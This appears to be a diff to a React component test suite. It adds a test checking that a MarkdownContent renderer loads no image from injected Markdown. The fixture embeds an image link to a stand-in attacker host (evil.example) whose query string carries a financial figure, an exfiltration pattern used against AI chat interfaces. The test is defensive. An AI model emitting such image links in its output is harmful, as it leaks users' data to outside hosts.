@@ -76,6 +76,14 @@ describe('MarkdownContent', () => {
     expect(link?.getAttribute('href') ?? '').not.toMatch(/^javascript:/i);
   });
 
+  it('loads no image the text names: an injected one would carry the data away', () => {
+    const { container } = render(
+      <MarkdownContent text={'Dư nợ 1.284 tỷ ![biểu đồ](https://evil.example/c.png?q=1284)'} />,
+    );
+    expect(container.querySelector('img')).toBeNull();
+    expect(container.innerHTML).not.toContain('evil.example');
+  });
+
   it('opens an http link in a new tab without an opener', () => {
     render(<MarkdownContent text="[NHNN](https://www.sbv.gov.vn)" />);
     const link = screen.getByRole('link', { name: 'NHNN' });
